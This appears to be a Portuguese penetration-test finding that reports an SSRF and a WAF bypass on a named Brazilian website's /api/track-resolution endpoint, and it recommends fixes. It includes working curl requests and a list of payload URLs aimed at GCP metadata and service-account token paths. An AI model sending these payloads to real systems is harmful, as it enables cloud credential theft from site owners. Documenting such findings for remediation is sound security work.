# F-037 SSRF via /api/track-resolution — metadata.google.internal WAF Bypass
Alvo: focusconcursos.com.br (Next.js + CloudFront WAF)
Severidade: Alta (SSRF + WAF bypass)
Timestamp: 2026-09-03T18:00:00Z

## Descrição
O endpoint `/api/track-resolution` aceita POST com JSON contendo campo `url`. 
O CloudFront WAF bloqueia IPs internos padrão (169.254.169.254, 127.0.0.1, etc.), 
mas NÃO bloqueia o hostname GCP metadata `metadata.google.internal`.

## Reprodução
```bash
# POST que passa pelo WAF (204 — aceito)
curl -sk -X POST "https://focusconcursos.com.br/api/track-resolution" \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/"}'

# Resposta: HTTP 204 (No Content) — URL aceita pelo sistema

# POST que é BLOQUEADO pelo WAF (403)
curl -sk -X POST "https://focusconcursos.com.br/api/track-resolution" \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Resposta: HTTP 403 — Blocked by CloudFront
```

## Comportamento Observado
| URL | Status | WAF | Nota |
|-----|--------|-----|------|
| `http://metadata.google.internal/` | 204 | ✅ Passa | GCP metadata SSRF |
| `http://metadata.google.internal/computeMetadata/v1/` | 204 | ✅ Passa | GCP metadata SSRF |
| `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | 204 | ✅ Passa | Token de acesso GCP |
| `http://169.254.169.254/latest/meta-data/` | 403 | ❌ Bloqueado | AWS metadata |
| `http://2852039166/latest/meta-data/` | 403 | ❌ Bloqueado | AWS metadata (decimal) |
| `http://google.com/` | 204 | ✅ Passa | Controle |
| `http://nonexistent.invalid/` | 204 | ✅ Passa | Domínio inválido |

| Método | Status | Observação |

| GET | 405 | Não permitido |
| POST | 204 | ✅ Aceito |

| PATCH | 405 | Não permitido |
| OPTIONS | 204 | CORS |
| HEAD | 405 | Não permitido |

## CORS
- `Access-Control-Allow-Origin: *` (qualquer origem)
- `Access-Control-Allow-Credentials: não configurado`
- Qualquer site pode enviar requisições para este endpoint

## Impacto
1. **Potencial SSRF para GCP Metadata**: Se o backend processar a URL (fetch/browser/worker), 
   o atacante pode obter credenciais de service account GCP do Google App Engine.
2. **WAF Bypass**: O hostname `metadata.google.internal` não está na blacklist do WAF.
3. **CORS + JWT**: Qualquer site pode usar as credenciais JWT do usuário para enviar 
   requisições SSRF via CORS.
4. **Data Exfiltration**: Se o endpoint for usado para tracking/reporting, metadados 
   de instância podem ser exfiltrados quando o worker processar a fila.

## Recomendação
1. Adicionar `metadata.google.internal`, `metadata`, `metadata.goog` e demais 
   hostnames de metadata à blacklist do CloudFront WAF.
2. Validar URLs no backend antes de processar — bloquear IPs RFC 1918 e link-local.
3. Implementar allowlist de domínios permitidos.
4. Adicionar Content-Security-Policy restritiva.
5. Se o endpoint não realiza fetch de URLs, remover o campo `url` do schema.

## Próximo Passo
